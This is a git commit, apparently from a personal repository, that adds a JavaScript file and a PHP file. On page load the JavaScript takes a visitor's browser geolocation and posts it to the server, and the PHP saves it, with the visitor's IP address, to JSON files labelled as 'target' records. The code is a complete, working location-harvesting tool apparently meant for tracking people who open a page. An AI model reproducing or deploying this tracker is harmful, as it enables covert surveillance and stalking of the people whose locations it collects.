1096f282211fb60776ca82330751954f257b146b
hlamyomann <hlamyomann@gmail.com>
2020-08-10 16:11:25 +0630

    update

---
+++ js/location.js
@@ -0,0 +1,15 @@
+
+
+$(document).ready(function(){
+
+    const successCallback=(position)=>{
+        console.log(position.coords);
+        var lat=position.coords.latitude;
+        var long=position.coords.longitude;
+        $.post("./save.php",
+        {lat:lat,long: long,},
+        function(data,status){console.log(data);});
+    }
+    const errorCallback=(error)=>{console.log(error);}
+    const watchId= navigator.geolocation.getCurrentPosition(successCallback,errorCallback);
+});
---
+++ save.php
@@ -0,0 +1,9 @@
+<?php
+$lat = $_POST['lat'];
+$long = $_POST['long'];
+$target_ip=$_SERVER['REMOTE_ADDR'];
+$new_location = fopen("locations/target_at".date('(M-d-Y|h:m)',time()).".json", "w");
+$data=array("target_ip"=>$target_ip,"latitude"=>$lat,"longitude"=>$long);
+$location=json_encode($data);
+fwrite($new_location, $location);
+fclose($new_location);
